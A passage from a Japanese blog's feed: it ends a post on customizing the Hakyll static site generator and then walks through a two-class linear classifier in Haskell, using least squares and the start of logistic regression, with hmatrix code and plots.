<span id="cb26-18"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb26-18" aria-hidden="true" tabindex="-1"></a>    classes <span class="ot">=</span> <span class="fu">words</span> <span class="op">.</span> fromMaybe <span class="st">&quot;&quot;</span> <span class="op">.</span> <span class="fu">lookup</span> <span class="st">&quot;class&quot;</span></span></code></pre></div>
<p>あとは、rule をこんな感じに書けば置換してくれます。</p>
<div class="sourceCode" id="cb27"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb27-1"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb27-1" aria-hidden="true" tabindex="-1"></a>match <span class="st">&quot;posts/*&quot;</span> <span class="op">$</span> <span class="kw">do</span></span>
<span id="cb27-2"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb27-2" aria-hidden="true" tabindex="-1"></a>  route <span class="op">$</span> setExtension <span class="st">&quot;html&quot;</span></span>
<span id="cb27-3"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb27-3" aria-hidden="true" tabindex="-1"></a>  compile <span class="op">$</span> pandocCompiler</span>
<span id="cb27-4"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb27-4" aria-hidden="true" tabindex="-1"></a>    <span class="op">&gt;&gt;=</span> loadAndApplyTemplate <span class="st">&quot;templates/post.html&quot;</span>    postCtx</span>
<span id="cb27-5"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb27-5" aria-hidden="true" tabindex="-1"></a>    <span class="op">&gt;&gt;=</span> loadAndApplyTemplate <span class="st">&quot;templates/default.html&quot;</span> postCtx</span>
<span id="cb27-6"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb27-6" aria-hidden="true" tabindex="-1"></a>    <span class="op">&gt;&gt;=</span> renderFontAwesome icons</span></code></pre></div>
<h2 id="おわり">おわり</h2>
<p>Hakyll、自分の好きな言語で細かなところまでいじれて、とてもおもしろい静的サイトジェネレータだなという感じです。ただ、こだわり始めると止まらなくなってしまう…</p>
<p>この記事に載せた Haskell のコードは、ほぼ全て <code>import</code> など一部の記述を省略しているので、詳しいことが気になったら <a href="https://github.com/Tosainu/blog">Tosainu/blog</a> を見てください。うーん、複数ファイルにまたがるコードを部分的に紹介していくのってどうするのがいいんだろう…</p>
<section class="footnotes footnotes-end-of-document" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p>何を基本的な文法とするかは微妙だけど…<a href="https://blog.myon.info/entry/2018/03/21/hakyll/#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2" role="doc-endnote"><p>ネストしたリストの小要素のインデントが4文字じゃないといけなかった点と、Middleman 時代に数式表示のために加えていた拡張の修正はした<a href="https://blog.myon.info/entry/2018/03/21/hakyll/#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn3" role="doc-endnote"><p>今確認したら記事消えてた…<a href="https://blog.myon.info/entry/2018/03/21/hakyll/#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>]]></summary>
</entry>
<entry>
    <title>簡単な2クラスの線形分類器を実装してみる</title>
    <link href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/index.html" />
    <id>https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/index.html</id>
    <published>2018-01-05T14:51:00Z</published>
    <updated>2018-01-05T14:51:00Z</updated>
    <summary type="html"><![CDATA[<p>あけましたおめでとうございます (✿╹◡╹)ﾉ</p>
<p>2017年は、今まで通っていた <code>echo 6auY5bCCCg== | base64 -d</code> を卒業し、情報の大学に編入しました。編入1年目ということでなかなか他のことに手を出せないくらい忙しかったのは辛かったけれど、念願の CS 講義を受けられるようになりとても充実した1年だった気がします。</p>
<p>今学期履修している講義に「機械学習・パターン認識論」があります。先輩方からの評判も良く、自分自身興味があったこともあり、とても楽しいと感じている講義の1つです。とはいえ、やっぱり数式を眺めていても理解できる気がしないので、コードを書いてみることにしました。</p>
<!--more-->
<h2 id="環境">環境</h2>
<p>流行りの言語やライブラリはいくつかありますが、どうもモチベが出ないので Haskell でやりました。ちょうどこの記事を書き始めてすぐに LTS Haskell 10.x (ghc-8.2.2) が出たみたいですが、今回はこれで。</p>
<ul>
<li>Arch Linux</li>
<li>Stack (Version 1.6.1)</li>
<li>LTS Haskell 9.18 (ghc-8.0.2)
<ul>
<li>Chart-1.8.2</li>
<li>hmatrix-0.18.0.0</li>
<li>hmatrix-gsl-0.18.0.1</li>
<li>random-1.1</li>
</ul></li>
</ul>
<h2 id="雑なデータセットを作る">雑なデータセットを作る</h2>
<p>まずは乱数でデータセットを作り、それを Chart でプロットしてみます。</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb1-1"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span>           <span class="dt">Control.Monad</span>                          (replicateM)</span>
<span id="cb1-2"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span>           <span class="dt">Graphics.Rendering.Chart.Backend.Cairo</span></span>
<span id="cb1-3"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span>           <span class="dt">Graphics.Rendering.Chart.Easy</span></span>
<span id="cb1-4"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="kw">import</span>           <span class="dt">System.Random</span></span>
<span id="cb1-5"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-6"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="co">-- https://stackoverflow.com/a/13669958</span></span>
<span id="cb1-7"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="kw">instance</span> (<span class="dt">Random</span> x, <span class="dt">Random</span> y) <span class="ot">=&gt;</span> <span class="dt">Random</span> (x, y) <span class="kw">where</span></span>
<span id="cb1-8"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-8" aria-hidden="true" tabindex="-1"></a>  randomR ((x1, y1), (x2, y2)) gen1 <span class="ot">=</span></span>
<span id="cb1-9"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-9" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> (x, gen2) <span class="ot">=</span> randomR (x1, x2) gen1</span>
<span id="cb1-10"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-10" aria-hidden="true" tabindex="-1"></a>        (y, gen3) <span class="ot">=</span> randomR (y1, y2) gen2</span>
<span id="cb1-11"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-11" aria-hidden="true" tabindex="-1"></a>    <span class="kw">in</span>  ((x, y), gen3)</span>
<span id="cb1-12"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-12" aria-hidden="true" tabindex="-1"></a>  random <span class="ot">=</span> <span class="fu">undefined</span></span>
<span id="cb1-13"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-14"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-14" aria-hidden="true" tabindex="-1"></a><span class="ot">main ::</span> <span class="dt">IO</span> ()</span>
<span id="cb1-15"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-15" aria-hidden="true" tabindex="-1"></a>main <span class="ot">=</span> <span class="kw">do</span></span>
<span id="cb1-16"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-16" aria-hidden="true" tabindex="-1"></a>  c1 <span class="ot">&lt;-</span> replicateM <span class="dv">50</span> <span class="op">$</span></span>
<span id="cb1-17"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-17" aria-hidden="true" tabindex="-1"></a>    getStdRandom <span class="op">$</span> randomR ((<span class="op">-</span><span class="fl">3.75</span>, <span class="fl">2.25</span>), (<span class="op">-</span><span class="fl">2.25</span>, <span class="fl">3.75</span>))<span class="ot"> ::</span> <span class="dt">IO</span> [(<span class="dt">Double</span>, <span class="dt">Double</span>)]</span>
<span id="cb1-18"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-18" aria-hidden="true" tabindex="-1"></a>  c2 <span class="ot">&lt;-</span> replicateM <span class="dv">50</span> <span class="op">$</span></span>
<span id="cb1-19"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-19" aria-hidden="true" tabindex="-1"></a>    getStdRandom <span class="op">$</span> randomR ((<span class="op">-</span><span class="fl">1.75</span>, <span class="fl">1.25</span>), (<span class="op">-</span><span class="fl">0.25</span>, <span class="fl">2.75</span>))<span class="ot"> ::</span> <span class="dt">IO</span> [(<span class="dt">Double</span>, <span class="dt">Double</span>)]</span>
<span id="cb1-20"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-20" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-21"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-21" aria-hidden="true" tabindex="-1"></a>  <span class="kw">let</span> fo <span class="ot">=</span> def { _fo_size   <span class="ot">=</span> (<span class="dv">480</span>, <span class="dv">480</span>)</span>
<span id="cb1-22"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-22" aria-hidden="true" tabindex="-1"></a>               , _fo_format <span class="ot">=</span> <span class="dt">SVG</span></span>
<span id="cb1-23"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-23" aria-hidden="true" tabindex="-1"></a>               }</span>
<span id="cb1-24"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-24" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-25"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-25" aria-hidden="true" tabindex="-1"></a>  toFile fo <span class="st">&quot;dataset.svg&quot;</span> <span class="op">$</span> <span class="kw">do</span></span>
<span id="cb1-26"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-26" aria-hidden="true" tabindex="-1"></a>    layout_x_axis <span class="op">.</span> laxis_generate <span class="op">.=</span> scaledAxis def (<span class="op">-</span><span class="dv">4</span>, <span class="dv">4</span>)</span>
<span id="cb1-27"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-27" aria-hidden="true" tabindex="-1"></a>    layout_x_axis <span class="op">.</span> laxis_title    <span class="op">.=</span> <span class="st">&quot;x1&quot;</span></span>
<span id="cb1-28"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-28" aria-hidden="true" tabindex="-1"></a>    layout_y_axis <span class="op">.</span> laxis_generate <span class="op">.=</span> scaledAxis def (<span class="op">-</span><span class="dv">4</span>, <span class="dv">4</span>)</span>
<span id="cb1-29"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-29" aria-hidden="true" tabindex="-1"></a>    layout_y_axis <span class="op">.</span> laxis_title    <span class="op">.=</span> <span class="st">&quot;x2&quot;</span></span>
<span id="cb1-30"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-30" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-31"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-31" aria-hidden="true" tabindex="-1"></a>    setShapes [<span class="dt">PointShapeCircle</span>, <span class="dt">PointShapeCircle</span>]</span>
<span id="cb1-32"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-32" aria-hidden="true" tabindex="-1"></a>    plot (points <span class="st">&quot;C1&quot;</span> c1)</span>
<span id="cb1-33"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb1-33" aria-hidden="true" tabindex="-1"></a>    plot (points <span class="st">&quot;C2&quot;</span> c2)</span></code></pre></div>
<p>出力された <code>dataset.svg</code> はこんな感じ。
<img src="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/dataset.svg" alt="dataset" /></p>
<p>この <span class="math inline">C_1</span> と <span class="math inline">C_2</span> を分類してみます。</p>
<h2 id="最小二乗法でパラメータを求める">最小二乗法でパラメータを求める</h2>
<p>識別関数 <span class="math inline">y(\boldsymbol{x})</span> を次式で表すことにします。</p>
<p><span class="math display">
y(\boldsymbol{x}) = \boldsymbol{w}^\top \boldsymbol{x} + w_0
</span></p>
<p>ここで、<span class="math inline">\boldsymbol{x}</span> は入力ベクトル</p>
<p><span class="math display">
\boldsymbol{x} = (x_1, \dots, x_M)^\top
</span></p>
<p><span class="math inline">\boldsymbol{w}</span> はパラメータベクトル</p>
<p><span class="math display">
\boldsymbol{w} = (w_1, \dots, w_M)^\top
</span></p>
<p><span class="math inline">w_0</span> はバイアスパラメータです。</p>
<p>この識別関数が <span class="math inline">y(\boldsymbol{x}) \ge 0</span> となれば <span class="math inline">C_1</span> に、<span class="math inline">y(\boldsymbol{x}) \lt 0</span> となれば <span class="math inline">C_2</span> に属すとし、これを満たすような <span class="math inline">\boldsymbol{w}</span>、<span class="math inline">w_0</span> を求めます。</p>
<p>まず、簡単化のため <span class="math inline">y(\boldsymbol{x})</span> を次のように変形。</p>
<p><span class="math display">
y(\boldsymbol{x}) = \tilde{\boldsymbol{w}}^\top \tilde{\boldsymbol{x}},\quad\tilde{\boldsymbol{w}} = (w_0, \boldsymbol{w}^\top)^\top,\quad\tilde{\boldsymbol{x}} = (1, \boldsymbol{x}^\top)^\top
</span></p>
<p>学習データ <span class="math inline">\tilde{\boldsymbol{X}}</span> と、それに対応する目的 (教師) ベクトル <span class="math inline">\boldsymbol{t}</span> を次のように定めると</p>
<p><span class="math display">
\begin{aligned}
  \tilde{\boldsymbol{X}} &amp;= (\tilde{\boldsymbol{x}}_1, \dots, \tilde{\boldsymbol{x}}_N)^\top \\
         \boldsymbol{t}  &amp;= (t_1, \dots, t_N)^\top \quad
             t_n =
               \begin{cases}
                  1,  &amp; \tilde{\boldsymbol{x}}_n \in C_1 \\
                 -1,  &amp; \tilde{\boldsymbol{x}}_n \in C_2
               \end{cases}
\end{aligned}
</span></p>
<p>パラメータベクトル <span class="math inline">\tilde{\boldsymbol{w}}</span> に関する2乗誤差関数 <span class="math inline">E_D (\tilde{\boldsymbol{w}})</span> は次のようになります。</p>
<p><span class="math display">
\begin{aligned}
  \boldsymbol{y}(\tilde{\boldsymbol{X}}) &amp;=
    \begin{pmatrix}
      y(\tilde{\boldsymbol{x}}_1) \\
      \vdots              \\
      y(\tilde{\boldsymbol{x}}_N)
    \end{pmatrix}           \\
  E_D (\tilde{\boldsymbol{w}}) &amp;= \frac{1}{2} (\boldsymbol{t} - \boldsymbol{y}(\tilde{\boldsymbol{X}}))^\top
                            (\boldsymbol{t} - \boldsymbol{y}(\tilde{\boldsymbol{X}}))                         \\
                       &amp;= \frac{1}{2} (\boldsymbol{t} - \tilde{\boldsymbol{X}} \tilde{\boldsymbol{w}})^\top
                            (\boldsymbol{t} - \tilde{\boldsymbol{X}} \tilde{\boldsymbol{w}})                  \\
                       &amp;= \frac{1}{2} (\boldsymbol{t}^\top \boldsymbol{t} - \boldsymbol{t}^\top \tilde{\boldsymbol{X}} \tilde{\boldsymbol{w}}
                            - \tilde{\boldsymbol{w}}^\top \tilde{\boldsymbol{X}}^\top \boldsymbol{t}
                            + \tilde{\boldsymbol{w}}^\top \tilde{\boldsymbol{X}}^\top \tilde{\boldsymbol{X}} \tilde{\boldsymbol{w}})
\end{aligned}
</span></p>
<p>この式が最小となる <span class="math inline">\tilde{\boldsymbol{w}}</span> を求めるため <span class="math inline">\tilde{\boldsymbol{w}}</span> で微分し</p>
<p><span class="math display">
\begin{aligned}
  \frac{\partial E_D(\tilde{\boldsymbol{w}})}{\partial \tilde{\boldsymbol{w}}} &amp;=
    - \tilde{\boldsymbol{X}} ^ \top \boldsymbol{t} + \tilde{\boldsymbol{X}}^\top \tilde{\boldsymbol{X}} \tilde{\boldsymbol{w}}
\end{aligned}
</span></p>
<p>それを <span class="math inline">0</span> とおくとこうなります。</p>
<p><span class="math display">
\begin{aligned}
    \tilde{\boldsymbol{X}}^\top \tilde{\boldsymbol{X}} \tilde{\boldsymbol{w}} &amp;= \tilde{\boldsymbol{X}} ^ \top \boldsymbol{t}     \\
    \tilde{\boldsymbol{w}} &amp;= (\tilde{\boldsymbol{X}} ^ \top \tilde{\boldsymbol{X}}) ^ {-1} \tilde{\boldsymbol{X}} ^ \top \boldsymbol{t} \\
    \tilde{\boldsymbol{w}} &amp;= \tilde{\boldsymbol{X}}^\dagger \boldsymbol{t}
\end{aligned}
</span></p>
<p>これを実装すればパラメータベクトルが求まりそうです。</p>
<p>ということで、まずは <code>c1</code> と <code>c2</code> から学習データ行列 <code>mx</code> と、それに対応する目的ベクトル <code>mt</code> をこんな感じで hmatrix のベクトル・行列にしてやります。</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb2-1"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="kw">let</span> xs    <span class="ot">=</span> c1 <span class="op">++</span> c2</span>
<span id="cb2-2"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb2-2" aria-hidden="true" tabindex="-1"></a>    n     <span class="ot">=</span> <span class="fu">length</span> xs</span>
<span id="cb2-3"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb2-3" aria-hidden="true" tabindex="-1"></a>    mx    <span class="ot">=</span> (n<span class="op">&gt;&lt;</span><span class="dv">3</span>) <span class="op">$</span> <span class="fu">concatMap</span> (\(x1, x2) <span class="ot">-&gt;</span> [<span class="fl">1.0</span>, x1, x2]) xs</span>
<span id="cb2-4"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb2-4" aria-hidden="true" tabindex="-1"></a>    mt    <span class="ot">=</span> vector <span class="op">$</span> <span class="fu">replicate</span> (<span class="fu">length</span> c1)   <span class="fl">1.0</span></span>
<span id="cb2-5"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb2-5" aria-hidden="true" tabindex="-1"></a>                  <span class="op">++</span> <span class="fu">replicate</span> (<span class="fu">length</span> c2) (<span class="op">-</span><span class="fl">1.0</span>)</span></code></pre></div>
<p>パラメータベクトルは一般逆行列を求める hmatrix の関数 <a href="https://hackage.haskell.org/package/hmatrix-0.18.1.0/docs/Numeric-LinearAlgebra.html#v:pinv"><code>pinv</code></a> を使って次のようにも書けますが</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb3-1"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="kw">let</span> mw    <span class="ot">=</span> pinv mx <span class="op">#&gt;</span> mt</span></code></pre></div>
<p>最小二乗法を解く便利な <a href="https://hackage.haskell.org/package/hmatrix-0.18.1.0/docs/Numeric-LinearAlgebra.html#v:-60--92--62-"><code>(&lt;\&gt;)</code></a> 演算子があったのでこれを使いました。</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb4-1"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="kw">let</span> mw    <span class="ot">=</span> mx <span class="op">&lt;</span>\<span class="op">&gt;</span> mt</span></code></pre></div>
<p>パラメータベクトルが求まったので、今度は識別境界を引いてみます。識別関数を <span class="math inline">y (\boldsymbol{x}) = 0</span> として式を変形するとこんな感じになるので</p>
<p><span class="math display">
\begin{aligned}
  \tilde{\boldsymbol{w}}^\top \tilde{\boldsymbol{x}} &amp;= 0 \\
  \tilde{w}_0 + \tilde{w}_1 \tilde{x}_1 + \tilde{w}_2 \tilde{x}_2 &amp;= 0 \\
  \tilde{x}_2 &amp;= \frac{- \tilde{w}_0 - \tilde{w}_1 \tilde{x}_1}{\tilde{w}_2}
\end{aligned}
</span></p>
<p>次のようなコードで <span class="math inline">(-5, y(-5))</span>、<span class="math inline">(5, y(5))</span> となる2点を求め、それを結ぶ直線を描画しました。</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb5-1"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">let</span> x1hat <span class="ot">=</span> [<span class="op">-</span><span class="fl">5.0</span>, <span class="fl">5.0</span>]</span>
<span id="cb5-2"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb5-2" aria-hidden="true" tabindex="-1"></a>    x2hat <span class="ot">=</span> <span class="fu">map</span> (\xi <span class="ot">-&gt;</span> (<span class="op">-</span> (mw <span class="op">!</span> <span class="dv">0</span>) <span class="op">-</span> (mw <span class="op">!</span> <span class="dv">1</span>) <span class="op">*</span> xi) <span class="op">/</span> (mw <span class="op">!</span> <span class="dv">2</span>)) x1hat</span>
<span id="cb5-3"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb5-3" aria-hidden="true" tabindex="-1"></a>    yhat  <span class="ot">=</span> <span class="fu">zip</span> x1hat x2hat</span>
<span id="cb5-4"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb5-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-5"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="co">-- ...</span></span>
<span id="cb5-6"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb5-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-7"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb5-7" aria-hidden="true" tabindex="-1"></a>toFile fo <span class="st">&quot;ls1.svg&quot;</span> <span class="op">$</span> <span class="kw">do</span></span>
<span id="cb5-8"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb5-8" aria-hidden="true" tabindex="-1"></a>  layout_x_axis <span class="op">.</span> laxis_generate <span class="op">.=</span> scaledAxis def (<span class="op">-</span><span class="dv">4</span>, <span class="dv">4</span>)</span>
<span id="cb5-9"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb5-9" aria-hidden="true" tabindex="-1"></a>  layout_x_axis <span class="op">.</span> laxis_title    <span class="op">.=</span> <span class="st">&quot;x1&quot;</span></span>
<span id="cb5-10"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb5-10" aria-hidden="true" tabindex="-1"></a>  layout_y_axis <span class="op">.</span> laxis_generate <span class="op">.=</span> scaledAxis def (<span class="op">-</span><span class="dv">4</span>, <span class="dv">4</span>)</span>
<span id="cb5-11"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb5-11" aria-hidden="true" tabindex="-1"></a>  layout_y_axis <span class="op">.</span> laxis_title    <span class="op">.=</span> <span class="st">&quot;x2&quot;</span></span>
<span id="cb5-12"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb5-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-13"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb5-13" aria-hidden="true" tabindex="-1"></a>  setShapes [<span class="dt">PointShapeCircle</span>, <span class="dt">PointShapeCircle</span>]</span>
<span id="cb5-14"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb5-14" aria-hidden="true" tabindex="-1"></a>  plot (points <span class="st">&quot;C1&quot;</span> c1)</span>
<span id="cb5-15"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb5-15" aria-hidden="true" tabindex="-1"></a>  plot (points <span class="st">&quot;C2&quot;</span> c2)</span>
<span id="cb5-16"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb5-16" aria-hidden="true" tabindex="-1"></a>  plot (line <span class="st">&quot;y&quot;</span>  [yhat])</span></code></pre></div>
<p>最終的なコードは<a href="https://gist.github.com/Tosainu/8df05092c75a53711efbda52ecec4c64">これ</a>で、出力された <code>ls1.svg</code> はこんな感じになりました。<span class="math inline">C_1</span> と <span class="math inline">C_2</span> の間に、それっぽく境界線が引けました。</p>
<figure>
<img src="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/ls1.svg" alt="ls1" />
<figcaption aria-hidden="true">ls1</figcaption>
</figure>
<h2 id="ロジスティック回帰でパラメータを求める">ロジスティック回帰でパラメータを求める</h2>
<p>データ点を生成している箇所をこんな感じに変更し、<span class="math inline">C_2</span> を <span class="math inline">(-1, 2)</span> 付近のほかに <span class="math inline">(3, -3)</span> 付近のデータを含むようにしてみます。</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb6-1"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="co">-- ...</span></span>
<span id="cb6-2"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="ot">main ::</span> <span class="dt">IO</span> ()</span>
<span id="cb6-3"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb6-3" aria-hidden="true" tabindex="-1"></a>main <span class="ot">=</span> <span class="kw">do</span></span>
<span id="cb6-4"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb6-4" aria-hidden="true" tabindex="-1"></a>  c1 <span class="ot">&lt;-</span> replicateM <span class="dv">50</span> <span class="op">$</span></span>
<span id="cb6-5"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb6-5" aria-hidden="true" tabindex="-1"></a>    getStdRandom <span class="op">$</span> randomR ((<span class="op">-</span><span class="fl">3.75</span>, <span class="fl">2.25</span>), (<span class="op">-</span><span class="fl">2.25</span>, <span class="fl">3.75</span>))<span class="ot"> ::</span> <span class="dt">IO</span> [(<span class="dt">Double</span>, <span class="dt">Double</span>)]</span>
<span id="cb6-6"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb6-6" aria-hidden="true" tabindex="-1"></a>  c21 <span class="ot">&lt;-</span> replicateM <span class="dv">25</span> <span class="op">$</span></span>
<span id="cb6-7"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb6-7" aria-hidden="true" tabindex="-1"></a>    getStdRandom <span class="op">$</span> randomR ((<span class="op">-</span><span class="fl">1.75</span>, <span class="fl">1.25</span>), (<span class="op">-</span><span class="fl">0.25</span>, <span class="fl">2.75</span>))<span class="ot"> ::</span> <span class="dt">IO</span> [(<span class="dt">Double</span>, <span class="dt">Double</span>)]</span>
<span id="cb6-8"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb6-8" aria-hidden="true" tabindex="-1"></a>  c22 <span class="ot">&lt;-</span> replicateM <span class="dv">25</span> <span class="op">$</span></span>
<span id="cb6-9"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb6-9" aria-hidden="true" tabindex="-1"></a>    getStdRandom <span class="op">$</span> randomR ((<span class="fl">2.25</span>, <span class="op">-</span><span class="fl">2.25</span>), (<span class="fl">3.75</span>, <span class="op">-</span><span class="fl">3.75</span>))<span class="ot"> ::</span> <span class="dt">IO</span> [(<span class="dt">Double</span>, <span class="dt">Double</span>)]</span>
<span id="cb6-10"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb6-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-11"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb6-11" aria-hidden="true" tabindex="-1"></a>  <span class="kw">let</span> c2    <span class="ot">=</span> c21 <span class="op">++</span> c22</span>
<span id="cb6-12"><a href="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/#cb6-12" aria-hidden="true" tabindex="-1"></a><span class="co">-- ...</span></span></code></pre></div>
<p>すると、出力された画像はこんな感じになってしまいました。最小二乗法は与えた全てのデータに対しての誤差を最小にしようとするので、外れ値や他クラスのデータがあるとそれに影響されてしまうわけですね。</p>
<figure>
<img src="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/ls2.svg" alt="ls2" />
<figcaption aria-hidden="true">ls2</figcaption>
</figure>
<p>そこで、次に示すロジスティック関数 (シグモイド関数) <span class="math inline">\sigma (a)</span> を使って、識別境界からの距離を確率的な距離 <span class="math inline">[0, 1]</span> としてみます。</p>
<p><span class="math display">
\sigma (a) = \frac{1}{1 + \exp(- a)}
</span></p>
<figure>
<img src="https://blog.myon.info/entry/2018/01/05/haskell-linear-classifier/sigmoid.svg" alt="sigmoid" />
<figcaption aria-hidden="true">sigmoid</figcaption>
</figure>
